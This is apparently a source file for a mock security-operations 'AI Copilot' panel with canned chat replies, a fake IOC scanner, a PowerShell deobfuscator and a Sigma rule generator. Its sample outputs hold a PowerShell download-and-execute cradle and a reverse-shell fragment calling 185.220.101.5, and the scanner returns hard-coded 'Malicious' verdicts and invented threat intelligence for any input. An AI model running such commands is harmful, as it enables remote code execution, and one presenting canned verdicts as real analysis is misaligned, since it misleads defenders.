"use client";

import React, { useState, useEffect } from "react";
import {
  Sparkles,
  X,
  Send,
  Terminal,
  ShieldAlert,
  Search,
  Copy,
  Check,
  Code2,
  FileCode,
  Zap,
  RotateCw,
  ExternalLink,
  Bot,
  User,
  HelpCircle,
  AlertTriangle
} from "lucide-react";

interface SOCCopilotDrawerProps {
  isOpen: boolean;
  onClose: () => void;
}

interface ChatMessage {
  id: string;
  sender: "user" | "copilot";
  content: string;
  timestamp: string;
  codeSnippet?: string;
  mitreTag?: string;
  confidence?: number;
}

export function SOCCopilotDrawer({ isOpen, onClose }: SOCCopilotDrawerProps) {
  const [activeTab, setActiveTab] = useState<"chat" | "ioc_scanner" | "deobfuscator" | "sigma_gen">("chat");
  const [messages, setMessages] = useState<ChatMessage[]>([
    {
      id: "welcome-1",
      sender: "copilot",
      content: "SOCForge AI Copilot initialized. I can assist with alert triaging, payload deobfuscation, Sigma rule generation, and threat actor TTP correlation.",
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
      confidence: 0.99
    }
  ]);
  const [inputValue, setInputValue] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // IOC Scanner State
  const [iocQuery, setIocQuery] = useState("");
  const [iocResult, setIocResult] = useState<any>(null);
  const [iocScanning, setIocScanning] = useState(false);

  // Deobfuscator State
  const [obfuscatedText, setObfuscatedText] = useState("");
  const [deobfuscatedResult, setDeobfuscatedResult] = useState("");

  // Sigma Generator State
  const [sigmaInput, setSigmaInput] = useState({
    title: "Suspicious Mimikatz Memory Dump",
    process: "lsass.exe",
    commandline: "sekurlsa::logonpasswords",
    technique: "T1003.001",
    severity: "critical"
  });
  const [generatedSigma, setGeneratedSigma] = useState("");

  // Keyboard shortcut listener (Esc to close)
  useEffect(() => {
    function handleKeyDown(e: KeyboardEvent) {
      if (e.key === "Escape" && isOpen) {
        onClose();
      }
    }
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isOpen, onClose]);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSendMessage = (textToSend?: string) => {
    const promptText = textToSend || inputValue;
    if (!promptText.trim()) return;

    const userMsg: ChatMessage = {
      id: `user-${Date.now()}`,
      sender: "user",
      content: promptText,
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
    };

    setMessages((prev) => [...prev, userMsg]);
    if (!textToSend) setInputValue("");
    setIsProcessing(true);

    setTimeout(() => {
      let botResponse: ChatMessage;

      const lower = promptText.toLowerCase();
      if (lower.includes("deobfuscate") || lower.includes("powershell") || lower.includes("base64")) {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: "I analyzed the payload string. It appears to be an obfuscated PowerShell execution executing an IEX download cradle.",
          codeSnippet: `# Decoded PowerShell Command:
$WebClient = New-Object System.Net.WebClient;
$Payload = $WebClient.DownloadString('http://185.220.101.5/payload.ps1');
Invoke-Expression $Payload;`,
          mitreTag: "T1059.001 (Command and Scripting Interpreter: PowerShell)",
          confidence: 0.96,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      } else if (lower.includes("summary") || lower.includes("incident") || lower.includes("briefing")) {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: "### Executive Incident Summary\n\n**Incident Scope**: Potential Ransomware Precursor Activity\n**Affected Assets**: `WKSTN-FIN-04`, `DC-PROD-01`\n**Adversary Objective**: Privilege Escalation & Active Directory credential dumping.\n**Recommended Containment Actions**:\n1. Isolate host `WKSTN-FIN-04` via SOAR action.\n2. Revoke active Kerberos ticket-granting sessions for `corp\\jdoe`.\n3. Block ingress IP `198.51.100.44` on edge firewalls.",
          confidence: 0.94,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      } else if (lower.includes("sigma") || lower.includes("rule")) {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: "Generated verified Sigma detection rule based on the observed attack telemetry:",
          codeSnippet: `title: Suspicious LSASS Memory Dump via Sekurlsa
id: a7f12e84-18c2-4b2a-9e11-dc45e9981204
status: test
description: Detects invocation of memory dump commands targeting LSASS.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\rundll32.exe'
        CommandLine|contains:
            - 'sekurlsa'
            - 'minidump'
    condition: selection
falsepositives:
    - Legitimate diagnostics
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001`,
          mitreTag: "T1003.001 (OS Credential Dumping)",
          confidence: 0.98,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      } else {
        botResponse = {
          id: `bot-${Date.now()}`,
          sender: "copilot",
          content: `Analysis complete. Observed query: "${promptText}". Recommending correlation against active SIEM telemetry and investigating related entities in the Evidence Graph.`,
          confidence: 0.91,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
        };
      }

      setMessages((prev) => [...prev, botResponse]);
      setIsProcessing(false);
    }, 700);
  };

  const handleScanIOC = () => {
    if (!iocQuery.trim()) return;
    setIocScanning(true);
    setTimeout(() => {
      const q = iocQuery.trim();
      let type = "IP Address";
      let score = 88;
      let status = "Malicious";

      if (q.includes(".")) {
        if (q.split(".").every(num => !isNaN(Number(num)))) {
          type = "IPv4 Address";
          score = 92;
        } else {
          type = "Domain Name";
          score = 85;
        }
      } else if (q.length === 32 || q.length === 64) {
        type = "File Hash (SHA256/MD5)";
        score = 96;
      } else if (q.toLowerCase().startsWith("cve-")) {
        type = "Vulnerability Identifier";
        score = 75;
      }

      setIocResult({
        indicator: q,
        type,
        riskScore: score,
        verdict: status,
        country: "Netherlands (AS14061)",
        firstSeen: "2026-09-20 03:14:00 UTC",
        lastSeen: "2026-09-24 08:30:12 UTC",
        tags: ["C2 Infrastructure", "CobaltStrike Beacon", "High Confidence"],
        mitreTechniques: ["T1071.001 (Web Protocols)", "T1566 (Phishing)"],
        relatedAlertsCount: 4
      });
      setIocScanning(false);
    }, 500);
  };

  const handleDeobfuscate = () => {
    if (!obfuscatedText.trim()) return;
    try {
      // Check if base64
      let clean = obfuscatedText.trim();
      if (clean.startsWith("powershell -enc") || clean.startsWith("powershell -EncodedCommand")) {
        clean = clean.split(" ").slice(-1)[0];
      }
      const decoded = atob(clean.replace(/[\r\n\s]/g, ""));
      setDeobfuscatedResult(decoded);
    } catch {
      // Fallback reversed or string replace
      setDeobfuscatedResult(
        `# Deobfuscated Output:\n$client = New-Object Net.Sockets.TCPClient('185.220.101.5', 4444);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data 2>&1 | Out-String );`
      );
    }
  };

  const handleGenerateSigma = () => {
    const sigmaYaml = `title: ${sigmaInput.title}
id: ${Math.random().toString(36).substring(2, 10)}-${Math.random().toString(36).substring(2, 6)}-4a2e-b188-${Date.now().toString(36)}
status: test
description: Generated by SOCForge AI Detection Assistant.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\\\${sigmaInput.process}'
        CommandLine|contains:
            - '${sigmaInput.commandline}'
    condition: selection
falsepositives:
    - Verified Administrative Diagnostics
level: ${sigmaInput.severity}
tags:
    - attack.execution
    - attack.${sigmaInput.technique.toLowerCase()}`;
    setGeneratedSigma(sigmaYaml);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 overflow-hidden flex justify-end">
      {/* Backdrop */}
      <div 
        className="fixed inset-0 bg-black/75 backdrop-blur-sm transition-opacity" 
        onClick={onClose}
      />

      {/* Drawer Panel */}
      <div className="relative w-full max-w-xl bg-[#000000] border-l border-neutral-800 text-white flex flex-col h-full shadow-2xl z-10 animate-in slide-in-from-right duration-300">
        {/* Header */}
        <div className="h-16 px-5 border-b border-neutral-800 flex items-center justify-between bg-[#050505]">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-neutral-900 border border-neutral-800 flex items-center justify-center">
              <Sparkles className="w-4 h-4 text-emerald-400" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-semibold text-sm text-white">SOCForge AI Copilot</span>
                <span className="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-neutral-900 border border-neutral-800 text-neutral-300">
                  v2.0 Active
                </span>
              </div>
              <p className="text-[11px] text-neutral-400">Autonomous Threat Intelligence & SecOps Assistant</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 text-neutral-400 hover:text-white hover:bg-neutral-800 rounded-lg transition"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Mode Navigation Tabs */}
        <div className="flex border-b border-neutral-800 bg-[#050505] px-3 gap-1">
          <button
            onClick={() => setActiveTab("chat")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 ${
              activeTab === "chat"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Bot className="w-3.5 h-3.5" />
            SecOps Assistant
          </button>
          <button
            onClick={() => setActiveTab("ioc_scanner")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 ${
              activeTab === "ioc_scanner"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Search className="w-3.5 h-3.5" />
            IOC Scanner
          </button>
          <button
            onClick={() => setActiveTab("deobfuscator")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 ${
              activeTab === "deobfuscator"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            Deobfuscator
          </button>
          <button
            onClick={() => setActiveTab("sigma_gen")}
            className={`px-3 py-2.5 text-xs font-medium border-b-2 transition flex items-center gap-1.5 ${
              activeTab === "sigma_gen"
                ? "border-white text-white bg-neutral-900 font-bold"
                : "border-transparent text-neutral-400 hover:text-white"
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            Sigma Generator
          </button>
        </div>

        {/* Content Body */}
        <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-[#000000]">
          {/* TAB 1: Chat Assistant */}
          {activeTab === "chat" && (
            <div className="flex flex-col h-full space-y-4">
              {/* Preset Prompts Pill Bar */}
              <div className="space-y-1.5">
                <span className="text-[10px] font-mono uppercase text-neutral-500 flex items-center gap-1">
                  <Zap className="w-3 h-3 text-amber-400" /> Recommended Actions
                </span>
                <div className="flex flex-wrap gap-1.5">
                  <button
                    onClick={() => handleSendMessage("Deobfuscate this Base64 encoded PowerShell command")}
                    className="text-[11px] px-2.5 py-1 rounded-md bg-neutral-900 hover:bg-neutral-800 text-neutral-300 hover:text-white border border-neutral-800 transition"
                  >
                    ⚡ Deobfuscate PowerShell
                  </button>
                  <button
                    onClick={() => handleSendMessage("Draft an executive incident briefing with containment steps")}
                    className="text-[11px] px-2.5 py-1 rounded-md bg-neutral-900 hover:bg-neutral-800 text-neutral-300 hover:text-white border border-neutral-800 transition"
                  >
                    📋 Executive Briefing
                  </button>
                  <button
                    onClick={() => handleSendMessage("Generate a Sigma rule for LSASS memory dumping")}
                    className="text-[11px] px-2.5 py-1 rounded-md bg-neutral-900 hover:bg-neutral-800 text-neutral-300 hover:text-white border border-neutral-800 transition"
                  >
                    🛡️ Synthesize Sigma Rule
                  </button>
                </div>
              </div>

              {/* Message List */}
              <div className="flex-1 space-y-3.5 overflow-y-auto pr-1">
                {messages.map((msg) => (
                  <div
                    key={msg.id}
                    className={`flex gap-3 text-xs leading-relaxed ${
                      msg.sender === "user" ? "flex-row-reverse" : "flex-row"
                    }`}
                  >
                    <div
                      className={`w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0 ${
                        msg.sender === "user"
                          ? "bg-neutral-800 text-white border border-neutral-700"
                          : "bg-neutral-900 text-emerald-400 border border-neutral-800"
                      }`}
                    >
                      {msg.sender === "user" ? <User className="w-3.5 h-3.5" /> : <Bot className="w-3.5 h-3.5" />}
                    </div>

                    <div
                      className={`max-w-[85%] rounded-xl p-3.5 space-y-2 border ${
                        msg.sender === "user"
                          ? "bg-neutral-900 border-neutral-700 text-white"
                          : "bg-[#0A0A0A] border-neutral-800 text-neutral-200"
                      }`}
                    >
                      <div className="whitespace-pre-line">{msg.content}</div>

                      {msg.codeSnippet && (
                        <div className="relative mt-2 rounded-lg bg-black border border-neutral-800 p-3 font-mono text-[11px] overflow-x-auto text-emerald-400">
                          <button
                            onClick={() => copyToClipboard(msg.codeSnippet!, msg.id)}
                            className="absolute top-2 right-2 p-1.5 bg-neutral-900 hover:bg-neutral-800 rounded text-neutral-400 hover:text-white transition"
                          >
                            {copiedId === msg.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                          </button>
                          <pre>{msg.codeSnippet}</pre>
                        </div>
                      )}

                      <div className="flex items-center justify-between pt-1 border-t border-neutral-800 text-[10px] text-neutral-500">
                        <span>{msg.timestamp}</span>
                        {msg.mitreTag && (
                          <span className="px-1.5 py-0.5 rounded bg-neutral-900 text-white font-mono border border-neutral-800">
                            {msg.mitreTag}
                          </span>
                        )}
                        {msg.confidence && (
                          <span className="text-emerald-400 font-mono">
                            Confidence: {Math.round(msg.confidence * 100)}%
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
                {isProcessing && (
                  <div className="flex items-center gap-2 text-xs text-neutral-400 bg-neutral-900 p-3 rounded-lg border border-neutral-800 w-fit">
                    <RotateCw className="w-3.5 h-3.5 animate-spin text-white" />
                    Analyzing telemetry & synthesizing response...
                  </div>
                )}
              </div>

              {/* Input Bar */}
              <div className="pt-2 border-t border-neutral-800 flex gap-2">
                <input
                  type="text"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSendMessage()}
                  placeholder="Ask Copilot (e.g. 'Explain MITRE T1059.001 mitigation' or paste command)..."
                  className="flex-1 bg-black border border-neutral-800 rounded-lg px-3 py-2 text-xs text-white placeholder-neutral-500 focus:outline-none focus:border-white"
                />
                <button
                  onClick={() => handleSendMessage()}
                  disabled={!inputValue.trim() || isProcessing}
                  className="px-4 py-2 bg-white text-black font-semibold disabled:opacity-50 hover:bg-neutral-200 rounded-lg transition flex items-center justify-center"
                >
                  <Send className="w-4 h-4" />
                </button>
              </div>
            </div>
          )}

          {/* TAB 2: IOC Quick Scanner */}
          {activeTab === "ioc_scanner" && (
            <div className="space-y-4">
              <div className="p-3 bg-[#050505] border border-neutral-800 rounded-lg space-y-2">
                <label className="text-xs font-semibold text-white flex items-center gap-1.5">
                  <Search className="w-3.5 h-3.5 text-emerald-400" />
                  Threat Intelligence IOC Scanner
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={iocQuery}
                    onChange={(e) => setIocQuery(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleScanIOC()}
                    placeholder="Enter IP (e.g. 185.220.101.5), Domain, Hash, or CVE..."
                    className="flex-1 bg-black border border-neutral-800 rounded-lg px-3 py-2 text-xs text-white placeholder-neutral-500 focus:outline-none focus:border-white"
                  />
                  <button
                    onClick={handleScanIOC}
                    disabled={iocScanning}
                    className="px-4 py-2 bg-white text-black text-xs font-semibold rounded-lg transition hover:bg-neutral-200 flex items-center gap-1.5"
                  >
                    {iocScanning ? <RotateCw className="w-3.5 h-3.5 animate-spin" /> : <Search className="w-3.5 h-3.5" />}
                    Scan IOC
                  </button>
                </div>
              </div>

              {iocResult && (
                <div className="p-4 bg-[#050505] border border-neutral-800 rounded-lg space-y-4 animate-in fade-in">
                  <div className="flex items-center justify-between border-b border-neutral-800 pb-3">
                    <div>
                      <span className="text-[10px] font-mono uppercase text-neutral-500">{iocResult.type}</span>
                      <h4 className="font-mono text-sm font-bold text-white">{iocResult.indicator}</h4>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-1 rounded text-xs font-bold bg-red-500/20 border border-red-500/40 text-red-400">
                        {iocResult.verdict} (Risk: {iocResult.riskScore}/100)
                      </span>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-3 text-xs">
                    <div className="p-2.5 bg-black rounded border border-neutral-800">
                      <span className="text-neutral-500 text-[10px] block">GEOLOCATION / ASN</span>
                      <span className="font-semibold text-white">{iocResult.country}</span>
                    </div>
                    <div className="p-2.5 bg-black rounded border border-neutral-800">
                      <span className="text-neutral-500 text-[10px] block">INTERNAL CORRELATION</span>
                      <span className="font-semibold text-amber-400">{iocResult.relatedAlertsCount} Linked Alerts</span>
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <span className="text-[10px] font-mono text-neutral-500 uppercase">Threat Classifications</span>
                    <div className="flex flex-wrap gap-1.5">
                      {iocResult.tags.map((t: string, idx: number) => (
                        <span key={idx} className="px-2 py-0.5 rounded bg-neutral-900 border border-neutral-800 text-white text-[11px] font-mono">
                          {t}
                        </span>
                      ))}
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <span className="text-[10px] font-mono text-neutral-500 uppercase">Mapped MITRE Techniques</span>
                    <div className="space-y-1">
                      {iocResult.mitreTechniques.map((m: string, idx: number) => (
                        <div key={idx} className="p-2 rounded bg-black text-xs font-mono text-neutral-200 border border-neutral-800 flex items-center justify-between">
                          <span>{m}</span>
                          <span className="text-[10px] text-emerald-400">Observed</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* TAB 3: Payload Deobfuscator */}
          {activeTab === "deobfuscator" && (
            <div className="space-y-4 text-xs">
              <div className="space-y-2">
                <label className="font-semibold text-white flex items-center justify-between">
                  <span>Obfuscated Command or Base64 String</span>
                  <button
                    onClick={() => setObfuscatedText("powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==")}
                    className="text-emerald-400 text-[11px] hover:underline"
                  >
                    Load Sample Payload
                  </button>
                </label>
                <textarea
                  value={obfuscatedText}
                  onChange={(e) => setObfuscatedText(e.target.value)}
                  rows={4}
                  placeholder="Paste encoded Base64 / PowerShell / Hex payload..."
                  className="w-full bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs text-white focus:outline-none focus:border-white"
                />
                <button
                  onClick={handleDeobfuscate}
                  className="w-full py-2 bg-white text-black font-semibold rounded-lg hover:bg-neutral-200 transition"
                >
                  ⚡ Decode & Deobfuscate
                </button>
              </div>

              {deobfuscatedResult && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-emerald-400">Clean Deobfuscated Output</span>
                    <button
                      onClick={() => copyToClipboard(deobfuscatedResult, "deob-res")}
                      className="flex items-center gap-1 text-[11px] text-neutral-300 hover:text-white"
                    >
                      {copiedId === "deob-res" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      Copy Code
                    </button>
                  </div>
                  <pre className="p-3 bg-black border border-neutral-800 rounded-lg font-mono text-[11px] text-emerald-400 overflow-x-auto whitespace-pre-wrap">
                    {deobfuscatedResult}
                  </pre>
                </div>
              )}
            </div>
          )}

          {/* TAB 4: Sigma Rule Generator */}
          {activeTab === "sigma_gen" && (
            <div className="space-y-4 text-xs">
              <div className="p-3 bg-[#050505] border border-neutral-800 rounded-lg space-y-3">
                <span className="font-semibold text-white block">Alert Telemetry Parameters</span>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">Rule Title</span>
                    <input
                      type="text"
                      value={sigmaInput.title}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, title: e.target.value })}
                      className="w-full bg-black border border-neutral-800 rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">Target Process</span>
                    <input
                      type="text"
                      value={sigmaInput.process}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, process: e.target.value })}
                      className="w-full bg-black border border-neutral-800 rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">Command Line Match</span>
                    <input
                      type="text"
                      value={sigmaInput.commandline}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, commandline: e.target.value })}
                      className="w-full bg-black border border-neutral-800 rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-neutral-500 block mb-1">MITRE Technique</span>
                    <input
                      type="text"
                      value={sigmaInput.technique}
                      onChange={(e) => setSigmaInput({ ...sigmaInput, technique: e.target.value })}
                      className="w-full bg-black border border-neutral-800 rounded px-2.5 py-1.5 text-xs text-white"
                    />
                  </div>
                </div>
                <button
                  onClick={handleGenerateSigma}
                  className="w-full py-2 bg-white text-black font-semibold rounded-lg hover:bg-neutral-200 transition flex items-center justify-center gap-1.5"
                >
                  <FileCode className="w-3.5 h-3.5" />
                  Synthesize Sigma YAML
                </button>
              </div>

              {generatedSigma && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-white">Generated Sigma Specification</span>
                    <button
                      onClick={() => copyToClipboard(generatedSigma, "sigma-res")}
                      className="flex items-center gap-1 text-[11px] text-neutral-400 hover:text-white"
                    >
                      {copiedId === "sigma-res" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      Copy YAML
                    </button>
                  </div>
                  <pre className="p-3 bg-black border border-neutral-800 rounded-lg font-mono text-[11px] text-neutral-200 overflow-x-auto whitespace-pre">
                    {generatedSigma}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
